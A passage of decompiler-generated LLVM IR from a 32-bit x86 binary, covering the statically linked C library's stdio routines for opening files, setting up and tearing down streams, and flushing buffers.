  br i1 %v3_805b8fe, label %dec_label_pc_805b8f5.dec_label_pc_805b91b_crit_edge, label %dec_label_pc_805b902

dec_label_pc_805b8f5.dec_label_pc_805b91b_crit_edge: ; preds = %dec_label_pc_805b8f5
  br label %dec_label_pc_805b91b

dec_label_pc_805b902:                             ; preds = %dec_label_pc_805b8f5
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_805b90b = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_805b90b, i32* %eax.global-to-local, align 4
  %v1_805b913 = icmp eq i32 %v3_805b90b, 0
  %v1_805b915 = icmp eq i1 %v1_805b913, false
  br i1 %v1_805b915, label %dec_label_pc_805b85a, label %dec_label_pc_805b902.dec_label_pc_805b91b_crit_edge

dec_label_pc_805b902.dec_label_pc_805b91b_crit_edge: ; preds = %dec_label_pc_805b902
  %v0_805b91b.pre = load i32, i32* @esi, align 4
  %v0_805b921.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805b91b

dec_label_pc_805b91b:                             ; preds = %dec_label_pc_805b8f5.dec_label_pc_805b91b_crit_edge, %dec_label_pc_805b902.dec_label_pc_805b91b_crit_edge
  %v0_805b921 = phi i32 [ %v1_805b8fe, %dec_label_pc_805b8f5.dec_label_pc_805b91b_crit_edge ], [ %v0_805b921.pre, %dec_label_pc_805b902.dec_label_pc_805b91b_crit_edge ]
  %v0_805b91b = phi i32 [ %v0_805b8f5, %dec_label_pc_805b8f5.dec_label_pc_805b91b_crit_edge ], [ %v0_805b91b.pre, %dec_label_pc_805b902.dec_label_pc_805b91b_crit_edge ]
  %v1_805b91b = and i32 %v0_805b91b, 32768
  %v2_805b921 = or i32 %v1_805b91b, %v0_805b921
  store i32 %v2_805b921, i32* @ebx, align 4
  br label %dec_label_pc_805b946

dec_label_pc_805b925:                             ; preds = %dec_label_pc_805b8d8
  %v1_805b925 = add i32 %arg4, 1
  %v8_805b925 = icmp eq i32 %v1_805b925, 0
  store i32 %v1_805b925, i32* @edi, align 4
  %v0_805b931.pre = load i32, i32* @ebx, align 4
  br i1 %v8_805b925, label %dec_label_pc_805b92b, label %dec_label_pc_805b928

dec_label_pc_805b928:                             ; preds = %dec_label_pc_805b925
  %v11_805b928 = or i32 %v0_805b931.pre, 32768
  store i32 %v11_805b928, i32* @ebx, align 4
  br label %dec_label_pc_805b92b

dec_label_pc_805b92b:                             ; preds = %dec_label_pc_805b925, %dec_label_pc_805b928
  %v0_805b931 = phi i32 [ %v11_805b928, %dec_label_pc_805b928 ], [ %v0_805b931.pre, %dec_label_pc_805b925 ]
  %v0_805b932 = load i32, i32* @esi, align 4
  store i32 %v0_805b932, i32* %stack_var_-76, align 4
  %v3_805b933 = trunc i32 %v0_805b931 to i8
  %v4_805b933 = call i32 @__libc_open(i32 %v0_805b932, i8 %v3_805b933, i32 438)
  store i32 %v4_805b933, i32* %eax.global-to-local, align 4
  %v1_805b93b = load i32, i32* @ebp, align 4
  %v2_805b93b = add i32 %v1_805b93b, 4
  %v3_805b93b = inttoptr i32 %v2_805b93b to i32*
  store i32 %v4_805b933, i32* %v3_805b93b, align 4
  %v2_805b93e = icmp slt i32 %v4_805b933, 0
  br i1 %v2_805b93e, label %dec_label_pc_805b86d, label %dec_label_pc_805b946

dec_label_pc_805b946:                             ; preds = %dec_label_pc_805b92b, %dec_label_pc_805b91b
  %v0_805b946 = load i32, i32* @ebp, align 4
  %v1_805b946 = inttoptr i32 %v0_805b946 to i16*
  %v2_805b946 = load i16, i16* %v1_805b946, align 2
  %v3_805b946 = and i16 %v2_805b946, 8192
  store i16 %v3_805b946, i16* %v1_805b946, align 2
  %v0_805b94c = load i32, i32* @ebx, align 4
  %v8_805b94e = and i32 %v0_805b94c, -31744
  %v1_805b953 = urem i32 %v0_805b94c, 4
  %v1_805b956 = add nuw nsw i32 %v1_805b953, 1
  store i32 %v1_805b956, i32* %eax.global-to-local, align 4
  %v1_805b957 = load i32, i32* @ebp, align 4
  %v2_805b957 = inttoptr i32 %v1_805b957 to i32*
  %v3_805b957 = load i32, i32* %v2_805b957, align 4
  %v4_805b957 = or i32 %v3_805b957, %v8_805b94e
  %v1_805b95a = mul nuw nsw i32 %v1_805b956, 16
  %v2_805b95d = xor i32 %v1_805b95a, 48
  store i32 %v2_805b95d, i32* %eax.global-to-local, align 4
  %v2_805b960 = or i32 %v4_805b957, %v2_805b95d
  store i32 %v2_805b960, i32* @ebx, align 4
  %v1_805b962 = trunc i32 %v2_805b960 to i16
  %v3_805b962 = inttoptr i32 %v1_805b957 to i16*
  store i16 %v1_805b962, i16* %v3_805b962, align 2
  %v0_805b966 = load i32, i32* %stack_var_-76, align 4
  %v1_805b966 = call i32 @__errno_location(i32 %v0_805b966)
  store i32 %v1_805b966, i32* %eax.global-to-local, align 4
  store i32 %v1_805b966, i32* @esi, align 4
  %v1_805b970 = inttoptr i32 %v1_805b966 to i32*
  %v2_805b970 = load i32, i32* %v1_805b970, align 4
  store i32 %v2_805b970, i32* @edi, align 4
  %v0_805b972 = load i32, i32* @ebp, align 4
  %v1_805b972 = add i32 %v0_805b972, 4
  %v2_805b972 = inttoptr i32 %v1_805b972 to i32*
  %v3_805b972 = load i32, i32* %v2_805b972, align 4
  store i32 %v3_805b972, i32* %stack_var_-76, align 4
  %v1_805b975 = call i32 @isatty(i32 %v3_805b972)
  %v2_805b97d = mul i32 %v1_805b975, 256
  store i32 %v2_805b97d, i32* %eax.global-to-local, align 4
  %v0_805b980 = load i32, i32* @ebx, align 4
  %v2_805b980 = or i32 %v0_805b980, %v2_805b97d
  store i32 %v2_805b980, i32* @ebx, align 4
  %v1_805b982 = trunc i32 %v2_805b980 to i16
  %v2_805b982 = load i32, i32* @ebp, align 4
  %v3_805b982 = inttoptr i32 %v2_805b982 to i16*
  store i16 %v1_805b982, i16* %v3_805b982, align 2
  %v0_805b986 = load i32, i32* @edi, align 4
  %v1_805b986 = load i32, i32* @esi, align 4
  %v2_805b986 = inttoptr i32 %v1_805b986 to i32*
  store i32 %v0_805b986, i32* %v2_805b986, align 4
  %v0_805b988 = load i32, i32* @ebp, align 4
  %v1_805b988 = add i32 %v0_805b988, 8
  %v2_805b988 = inttoptr i32 %v1_805b988 to i32*
  %v3_805b988 = load i32, i32* %v2_805b988, align 4
  %v4_805b988 = icmp eq i32 %v3_805b988, 0
  %v1_805b98c = icmp eq i1 %v4_805b988, false
  br i1 %v1_805b98c, label %dec_label_pc_805b9bc, label %dec_label_pc_805b98e

dec_label_pc_805b98e:                             ; preds = %dec_label_pc_805b946
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_805b996 = call i32 @malloc(i32 4096)
  store i32 %v1_805b996, i32* %eax.global-to-local, align 4
  %v1_805b99e = load i32, i32* @ebp, align 4
  %v2_805b99e = add i32 %v1_805b99e, 8
  %v3_805b99e = inttoptr i32 %v2_805b99e to i32*
  store i32 %v1_805b996, i32* %v3_805b99e, align 4
  %v1_805b9a1 = icmp eq i32 %v1_805b996, 0
  %v0_805b9b5 = load i32, i32* @ebp, align 4
  br i1 %v1_805b9a1, label %dec_label_pc_805b9b5, label %dec_label_pc_805b9a5

dec_label_pc_805b9a5:                             ; preds = %dec_label_pc_805b98e
  %v1_805b9a5 = inttoptr i32 %v0_805b9b5 to i16*
  %v2_805b9a5 = load i16, i16* %v1_805b9a5, align 2
  %v3_805b9a5 = or i16 %v2_805b9a5, 16384
  store i16 %v3_805b9a5, i16* %v1_805b9a5, align 2
  %v1_805b9ab = add i32 %v1_805b996, 4096
  store i32 %v1_805b9ab, i32* %eax.global-to-local, align 4
  %v1_805b9b0 = load i32, i32* @ebp, align 4
  %v2_805b9b0 = add i32 %v1_805b9b0, 12
  %v3_805b9b0 = inttoptr i32 %v2_805b9b0 to i32*
  store i32 %v1_805b9ab, i32* %v3_805b9b0, align 4
  br label %dec_label_pc_805b9bc

dec_label_pc_805b9b5:                             ; preds = %dec_label_pc_805b98e
  %v1_805b9b5 = add i32 %v0_805b9b5, 12
  %v2_805b9b5 = inttoptr i32 %v1_805b9b5 to i32*
  store i32 0, i32* %v2_805b9b5, align 4
  br label %dec_label_pc_805b9bc

dec_label_pc_805b9bc:                             ; preds = %dec_label_pc_805b946, %dec_label_pc_805b9a5, %dec_label_pc_805b9b5
  %v0_805b9bc = load i32, i32* @ebp, align 4
  %v1_805b9bc = add i32 %v0_805b9bc, 8
  %v2_805b9bc = inttoptr i32 %v1_805b9bc to i32*
  %v3_805b9bc = load i32, i32* %v2_805b9bc, align 4
  store i32 %v3_805b9bc, i32* %eax.global-to-local, align 4
  %v1_805b9bf = add i32 %v0_805b9bc, 2
  %v2_805b9bf = inttoptr i32 %v1_805b9bf to i8*
  store i8 0, i8* %v2_805b9bf, align 1
  %v0_805b9c3 = load i32, i32* %eax.global-to-local, align 4
  %v1_805b9c3 = load i32, i32* @ebp, align 4
  %v2_805b9c3 = add i32 %v1_805b9c3, 24
  %v3_805b9c3 = inttoptr i32 %v2_805b9c3 to i32*
  store i32 %v0_805b9c3, i32* %v3_805b9c3, align 4
  %v0_805b9c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_805b9c6 = load i32, i32* @ebp, align 4
  %v2_805b9c6 = add i32 %v1_805b9c6, 28
  %v3_805b9c6 = inttoptr i32 %v2_805b9c6 to i32*
  store i32 %v0_805b9c6, i32* %v3_805b9c6, align 4
  %v0_805b9c9 = load i32, i32* %eax.global-to-local, align 4
  %v1_805b9c9 = load i32, i32* @ebp, align 4
  %v2_805b9c9 = add i32 %v1_805b9c9, 16
  %v3_805b9c9 = inttoptr i32 %v2_805b9c9 to i32*
  store i32 %v0_805b9c9, i32* %v3_805b9c9, align 4
  %v0_805b9cc = load i32, i32* %eax.global-to-local, align 4
  %v1_805b9cc = load i32, i32* @ebp, align 4
  %v2_805b9cc = add i32 %v1_805b9cc, 20
  %v3_805b9cc = inttoptr i32 %v2_805b9cc to i32*
  store i32 %v0_805b9cc, i32* %v3_805b9cc, align 4
  %v0_805b9cf = load i32, i32* @ebp, align 4
  %v1_805b9cf = add i32 %v0_805b9cf, 44
  %v2_805b9cf = inttoptr i32 %v1_805b9cf to i32*
  store i32 0, i32* %v2_805b9cf, align 4
  %v0_805b9d6 = load i32, i32* @ebp, align 4
  %v1_805b9d6 = add i32 %v0_805b9d6, 1
  %v2_805b9d6 = inttoptr i32 %v1_805b9d6 to i8*
  %v3_805b9d6 = load i8, i8* %v2_805b9d6, align 1
  %v4_805b9d6 = and i8 %v3_805b9d6, 32
  %v5_805b9d6 = icmp eq i8 %v4_805b9d6, 0
  %v0_805b9da = load i32, i32* @global_var_8074650.668, align 16
  store i32 %v0_805b9da, i32* %eax.global-to-local, align 4
  %v2_805b9df = add i32 %v0_805b9d6, 52
  %v3_805b9df = inttoptr i32 %v2_805b9df to i32*
  store i32 %v0_805b9da, i32* %v3_805b9df, align 4
  br i1 %v5_805b9d6, label %dec_label_pc_805ba51, label %dec_label_pc_805b9e4

dec_label_pc_805b9e4:                             ; preds = %dec_label_pc_805b9bc
  %v2_805b9ef = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805b9ef, i32* @esi, align 4
  store i32 %v2_805b9ef, i32* %stack_var_-76, align 4
  %v4_805b9f4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_8074638.686 to i32))
  store i32 %v4_805b9f4, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8074638.686 to i32), i32* %stack_var_-76, align 4
  %v1_805ba00 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074638.686 to i32))
  store i32 %v1_805ba00, i32* %eax.global-to-local, align 4
  %v2_805ba12 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805ba12, i32* @ebx, align 4
  store i32 %v2_805ba12, i32* %stack_var_-76, align 4
  %v4_805ba17 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134585853, i32 ptrtoint (i32* @global_var_8074620.697 to i32))
  store i32 %v4_805ba17, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8074620.697 to i32), i32* %stack_var_-76, align 4
  %v1_805ba23 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074620.697 to i32))
  %v0_805ba28 = load i32, i32* bitcast (i32** @global_var_807461c.665 to i32*), align 4
  store i32 %v0_805ba28, i32* %eax.global-to-local, align 4
  %v1_805ba2d = load i32, i32* @ebp, align 4
  %v2_805ba2d = add i32 %v1_805ba2d, 32
  %v3_805ba2d = inttoptr i32 %v2_805ba2d to i32*
  store i32 %v0_805ba28, i32* %v3_805ba2d, align 4
  %v0_805ba30 = load i32, i32* @ebp, align 4
  store i32 %v0_805ba30, i32* bitcast (i32** @global_var_807461c.665 to i32*), align 4
  %v2_805ba36 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805ba36, i32* @ecx, align 4
  store i32 %v2_805ba12, i32* %stack_var_-76, align 4
  %v3_805ba3b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  store i32 %v2_805ba12, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  store i32 %v2_805b9ef, i32* %stack_var_-76, align 4
  %v3_805ba45 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_805ba45, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ba4a

dec_label_pc_805ba4a:                             ; preds = %dec_label_pc_805b877, %dec_label_pc_805b9e4
  br label %dec_label_pc_805ba51

dec_label_pc_805ba4f:                             ; preds = %dec_label_pc_805b86d, %dec_label_pc_805b85a
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805ba51

dec_label_pc_805ba51:                             ; preds = %dec_label_pc_805b9bc, %dec_label_pc_805b8a6, %dec_label_pc_805ba4a, %dec_label_pc_805ba4f
  %v0_805ba54 = load i32, i32* @ebp, align 4
  store i32 %v0_805ba54, i32* %eax.global-to-local, align 4
  %v2_805ba56 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805ba56, i32* @ebx, align 4
  store i32 %v0_805b82e, i32* @esi, align 4
  store i32 %v0_805b82d, i32* @edi, align 4
  store i32 %v0_805b82c, i32* @ebp, align 4
  ret i32 %v0_805ba54

; uselistorder directives
  uselistorder i32 %v0_805b9b5, { 1, 0 }
  uselistorder i32 %v1_805b996, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805b97d, { 1, 0 }
  uselistorder i32 %v1_805b966, { 1, 0, 2 }
  uselistorder i32 %v11_805b928, { 1, 0 }
  uselistorder i32 %v0_805b931.pre, { 1, 0 }
  uselistorder i32 %v1_805b8f9, { 1, 0 }
  uselistorder i32 %v0_805b8f5, { 1, 0 }
  uselistorder i32 %v1_805b8ab, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_805b89a, { 1, 0 }
  uselistorder i32 %v0_805b86d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33 }
  uselistorder i32 %arg4, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_805ba51, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_805ba4a, { 1, 0 }
  uselistorder label %dec_label_pc_805b9bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805b92b, { 1, 0 }
  uselistorder label %dec_label_pc_805b91b, { 1, 0 }
  uselistorder label %dec_label_pc_805b8d8, { 1, 0 }
  uselistorder label %dec_label_pc_805b8a2, { 1, 0 }
  uselistorder label %dec_label_pc_805b894, { 1, 0 }
  uselistorder label %dec_label_pc_805b889, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805ba5d = load i32, i32* @edi, align 4
  %v0_805ba5e = load i32, i32* @esi, align 4
  %v0_805ba5f = load i32, i32* @ebx, align 4
  store i32 %v0_805ba5f, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_805ba68 = call i32 @__errno_location(i32 %v0_805ba5f)
  store i32 %v1_805ba68, i32* @edi, align 4
  %v0_805ba72 = load i32, i32* @global_var_8074660.664, align 32
  store i32 %v0_805ba72, i32* @esi, align 4
  %v1_805ba78 = inttoptr i32 %v1_805ba68 to i32*
  %v2_805ba78 = load i32, i32* %v1_805ba78, align 4
  store i32 %v2_805ba78, i32* %ebp.global-to-local, align 4
  %v1_805ba7c = call i32 @isatty(i32 0)
  %v0_805ba81 = load i32, i32* @ebx, align 4
  %v2_805ba83 = sub i32 %v0_805ba81, %v1_805ba7c
  %v2_805ba8e = mul i32 %v2_805ba83, 256
  %v0_805ba91 = load i32, i32* @esi, align 4
  %v2_805ba91 = xor i32 %v0_805ba91, %v2_805ba8e
  %v1_805ba93 = trunc i32 %v2_805ba91 to i16
  store i16 %v1_805ba93, i16* bitcast (i32* @global_var_8074660.664 to i16*), align 32
  %v0_805ba9a = load i32, i32* @global_var_80746b0.684, align 16
  store i32 %v0_805ba9a, i32* @esi, align 4
  %v1_805baa0 = call i32 @isatty(i32 1)
  %v0_805baa5 = load i32, i32* @ebx, align 4
  %v2_805baa5 = sub i32 %v0_805baa5, %v1_805baa0
  %v2_805baa7 = mul i32 %v2_805baa5, 256
  %v0_805baaa = load i32, i32* @esi, align 4
  %v2_805baaa = xor i32 %v2_805baa7, %v0_805baaa
  %v1_805baac = trunc i32 %v2_805baaa to i16
  store i16 %v1_805baac, i16* bitcast (i32* @global_var_80746b0.684 to i16*), align 16
  %v0_805bab3 = load i32, i32* %ebp.global-to-local, align 4
  %v1_805bab3 = load i32, i32* @edi, align 4
  %v2_805bab3 = inttoptr i32 %v1_805bab3 to i32*
  store i32 %v0_805bab3, i32* %v2_805bab3, align 4
  %v2_805bab8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805bab8, i32* @ebx, align 4
  store i32 %v0_805ba5e, i32* @esi, align 4
  store i32 %v0_805ba5d, i32* @edi, align 4
  ret i32 %v1_805baa0

; uselistorder directives
  uselistorder i32 %v1_805ba68, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805bacb = inttoptr i32 %arg1 to i16*
  %v4_805bacb = call i32 @memcpy(i16* %v3_805bacb, i32 ptrtoint (i32* @global_var_806caf4.698 to i32), i32 24)
  ret i32 %v4_805bacb
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805bad4 = load i32, i32* @esi, align 4
  %v0_805bad5 = load i32, i32* @ebx, align 4
  store i32 %v0_805bad5, i32* %stack_var_-8, align 4
  %v2_805bade = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8074620.697 to i32))
  store i32 %v2_805bade, i32* %eax.global-to-local, align 4
  %v2_805baea = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8074638.686 to i32))
  store i32 %v2_805baea, i32* %eax.global-to-local, align 4
  %storemerge22 = load i32, i32* bitcast (i32** @global_var_807461c.665 to i32*), align 4
  store i32 %storemerge22, i32* @ebx, align 4
  %v1_805bb3423 = icmp eq i32 %storemerge22, 0
  %v1_805bb3624 = icmp eq i1 %v1_805bb3423, false
  br i1 %v1_805bb3624, label %dec_label_pc_805baf7.lr.ph, label %dec_label_pc_805bb54.preheader

dec_label_pc_805baf7.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805baf7

dec_label_pc_805baf7:                             ; preds = %dec_label_pc_805baf7.lr.ph, %dec_label_pc_805bb1e
  %storemerge25 = phi i32 [ %storemerge22, %dec_label_pc_805baf7.lr.ph ], [ %storemerge, %dec_label_pc_805bb1e ]
  %v1_805bafa = add i32 %storemerge25, 56
  store i32 %v1_805bafa, i32* @esi, align 4
  %v2_805bafe = call i32 @pthread_mutex_trylock(i32 %v1_805bafa)
  store i32 %v2_805bafe, i32* %eax.global-to-local, align 4
  %v1_805bb06 = icmp eq i32 %v2_805bafe, 0
  br i1 %v1_805bb06, label %dec_label_pc_805bb1e, label %dec_label_pc_805bb0a

dec_label_pc_805bb0a:                             ; preds = %dec_label_pc_805baf7
  %v0_805bb0a = load i32, i32* @ebx, align 4
  %v1_805bb0a = add i32 %v0_805bb0a, 8
  %v2_805bb0a = inttoptr i32 %v1_805bb0a to i32*
  %v3_805bb0a = load i32, i32* %v2_805bb0a, align 4
  store i32 %v3_805bb0a, i32* %eax.global-to-local, align 4
  %v1_805bb0d = inttoptr i32 %v0_805bb0a to i16*
  store i16 48, i16* %v1_805bb0d, align 2
  %v0_805bb12 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bb12 = load i32, i32* @ebx, align 4
  %v2_805bb12 = add i32 %v1_805bb12, 24
  %v3_805bb12 = inttoptr i32 %v2_805bb12 to i32*
  store i32 %v0_805bb12, i32* %v3_805bb12, align 4
  %v0_805bb15 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bb15 = load i32, i32* @ebx, align 4
  %v2_805bb15 = add i32 %v1_805bb15, 28
  %v3_805bb15 = inttoptr i32 %v2_805bb15 to i32*
  store i32 %v0_805bb15, i32* %v3_805bb15, align 4
  %v0_805bb18 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bb18 = load i32, i32* @ebx, align 4
  %v2_805bb18 = add i32 %v1_805bb18, 16
  %v3_805bb18 = inttoptr i32 %v2_805bb18 to i32*
  store i32 %v0_805bb18, i32* %v3_805bb18, align 4
  %v0_805bb1b = load i32, i32* %eax.global-to-local, align 4
  %v1_805bb1b = load i32, i32* @ebx, align 4
  %v2_805bb1b = add i32 %v1_805bb1b, 20
  %v3_805bb1b = inttoptr i32 %v2_805bb1b to i32*
  store i32 %v0_805bb1b, i32* %v3_805bb1b, align 4
  br label %dec_label_pc_805bb1e

dec_label_pc_805bb1e:                             ; preds = %dec_label_pc_805baf7, %dec_label_pc_805bb0a
  %v0_805bb21 = load i32, i32* @ebx, align 4
  %v1_805bb21 = add i32 %v0_805bb21, 52
  %v2_805bb21 = inttoptr i32 %v1_805bb21 to i32*
  store i32 1, i32* %v2_805bb21, align 4
  %v0_805bb28 = load i32, i32* @esi, align 4
  %v2_805bb29 = call i32 @__stdio_init_mutex(i32 %v0_805bb28)
  store i32 %v2_805bb29, i32* %eax.global-to-local, align 4
  %v0_805bb2e = load i32, i32* @ebx, align 4
  %v1_805bb2e = add i32 %v0_805bb2e, 32
  %v2_805bb2e = inttoptr i32 %v1_805bb2e to i32*
  %storemerge = load i32, i32* %v2_805bb2e, align 4
  store i32 %storemerge, i32* @ebx, align 4
  %v1_805bb34 = icmp eq i32 %storemerge, 0
  %v1_805bb36 = icmp eq i1 %v1_805bb34, false
  br i1 %v1_805bb36, label %dec_label_pc_805baf7, label %dec_label_pc_805bb31.dec_label_pc_805bb54.preheader_crit_edge

dec_label_pc_805bb31.dec_label_pc_805bb54.preheader_crit_edge: ; preds = %dec_label_pc_805bb1e
  %storemerge23.pre = load i32, i32* bitcast (i32** @global_var_807461c.665 to i32*), align 4
  br label %dec_label_pc_805bb54.preheader

dec_label_pc_805bb54.preheader:                   ; preds = %dec_label_pc_805bb31.dec_label_pc_805bb54.preheader_crit_edge, %entry
  %storemerge23 = phi i32 [ %storemerge23.pre, %dec_label_pc_805bb31.dec_label_pc_805bb54.preheader_crit_edge ], [ %storemerge22, %entry ]
  store i32 %storemerge23, i32* @ebx, align 4
  %v1_805bb544 = icmp eq i32 %storemerge23, 0
  %v1_805bb5611 = icmp eq i1 %v1_805bb544, false
  br i1 %v1_805bb5611, label %dec_label_pc_805bb40.preheader, label %dec_label_pc_805bb58

dec_label_pc_805bb40.preheader:                   ; preds = %dec_label_pc_805bb54.preheader
  br label %dec_label_pc_805bb40

dec_label_pc_805bb40:                             ; preds = %dec_label_pc_805bb40.preheader, %dec_label_pc_805bb51
  %v0_805bb48 = phi i32 [ %storemerge2, %dec_label_pc_805bb51 ], [ %storemerge23, %dec_label_pc_805bb40.preheader ]
  %v1_805bb40 = inttoptr i32 %v0_805bb48 to i8*
  %v2_805bb40 = load i8, i8* %v1_805bb40, align 1
  %v3_805bb40 = and i8 %v2_805bb40, 64
  %v4_805bb40 = icmp eq i8 %v3_805bb40, 0
  br i1 %v4_805bb40, label %dec_label_pc_805bb51, label %dec_label_pc_805bb45

dec_label_pc_805bb45:                             ; preds = %dec_label_pc_805bb40
  %v2_805bb49 = call i32 @__stdio_wcommit(i32 %v0_805bb48)
  store i32 %v2_805bb49, i32* %eax.global-to-local, align 4
  %v0_805bb51.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805bb51

dec_label_pc_805bb51:                             ; preds = %dec_label_pc_805bb40, %dec_label_pc_805bb45
  %v0_805bb51 = phi i32 [ %v0_805bb48, %dec_label_pc_805bb40 ], [ %v0_805bb51.pre, %dec_label_pc_805bb45 ]
  %v1_805bb51 = add i32 %v0_805bb51, 32
  %v2_805bb51 = inttoptr i32 %v1_805bb51 to i32*
  %storemerge2 = load i32, i32* %v2_805bb51, align 4
  store i32 %storemerge2, i32* @ebx, align 4
  %v1_805bb54 = icmp eq i32 %storemerge2, 0
  %v1_805bb56 = icmp eq i1 %v1_805bb54, false
  br i1 %v1_805bb56, label %dec_label_pc_805bb40, label %dec_label_pc_805bb58

dec_label_pc_805bb58:                             ; preds = %dec_label_pc_805bb51, %dec_label_pc_805bb54.preheader
  %v2_805bb58 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805bb58, i32* %eax.global-to-local, align 4
  %v2_805bb59 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805bb59, i32* @ebx, align 4
  store i32 %v0_805bad4, i32* @esi, align 4
  ret i32 %v2_805bb58

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 2, 0 }
  uselistorder i32 %storemerge23, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_805bb51, { 1, 0 }
  uselistorder label %dec_label_pc_805bb40, { 1, 0 }
  uselistorder label %dec_label_pc_805bb1e, { 1, 0 }
  uselistorder label %dec_label_pc_805baf7, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_805bb5c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805bb64 = add i32 %arg1, 8
  %v2_805bb64 = inttoptr i32 %v1_805bb64 to i32*
  %v3_805bb64 = load i32, i32* %v2_805bb64, align 4
  store i32 %v3_805bb64, i32* %edx.global-to-local, align 4
  %v1_805bb67 = add i32 %arg1, 16
  %v2_805bb67 = inttoptr i32 %v1_805bb67 to i32*
  %v3_805bb67 = load i32, i32* %v2_805bb67, align 4
  %v2_805bb6a = sub i32 %v3_805bb67, %v3_805bb64
  %v12_805bb6a = icmp eq i32 %v2_805bb6a, 0
  store i32 %v2_805bb6a, i32* %eax.global-to-local, align 4
  br i1 %v12_805bb6a, label %dec_label_pc_805bb7d, label %dec_label_pc_805bb6e

dec_label_pc_805bb6e:                             ; preds = %entry
  store i32 %v3_805bb64, i32* %v2_805bb67, align 4
  %v0_805bb71 = load i32, i32* @ecx, align 4
  %v0_805bb72 = load i32, i32* %eax.global-to-local, align 4
  %v0_805bb73 = load i32, i32* %edx.global-to-local, align 4
  %v0_805bb74 = load i32, i32* @ebx, align 4
  %v4_805bb75 = inttoptr i32 %v0_805bb74 to i16*
  %v5_805bb75 = call i32 @__stdio_WRITE(i16* %v4_805bb75, i32 %v0_805bb73, i32 %v0_805bb72, i32 %v0_805bb71)
  store i32 %v5_805bb75, i32* %eax.global-to-local, align 4
  %v0_805bb7d.pre = load i32, i32* @ebx, align 4
  %v2_805bb83.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805bb7d

dec_label_pc_805bb7d:                             ; preds = %entry, %dec_label_pc_805bb6e
  %v2_805bb83 = phi i32 [ %tmp11, %entry ], [ %v2_805bb83.pre, %dec_label_pc_805bb6e ]
  %v0_805bb7d = phi i32 [ %arg1, %entry ], [ %v0_805bb7d.pre, %dec_label_pc_805bb6e ]
  %v1_805bb7d = add i32 %v0_805bb7d, 16
  %v2_805bb7d = inttoptr i32 %v1_805bb7d to i32*
  %v3_805bb7d = load i32, i32* %v2_805bb7d, align 4
  store i32 %v3_805bb7d, i32* %eax.global-to-local, align 4
  %v2_805bb80 = add i32 %v0_805bb7d, 8
  %v3_805bb80 = inttoptr i32 %v2_805bb80 to i32*
  %v4_805bb80 = load i32, i32* %v3_805bb80, align 4
  %v5_805bb80 = sub i32 %v3_805bb7d, %v4_805bb80
  store i32 %v5_805bb80, i32* %eax.global-to-local, align 4
  store i32 %v2_805bb83, i32* @edx, align 4
  store i32 %v0_805bb5c, i32* @ebx, align 4
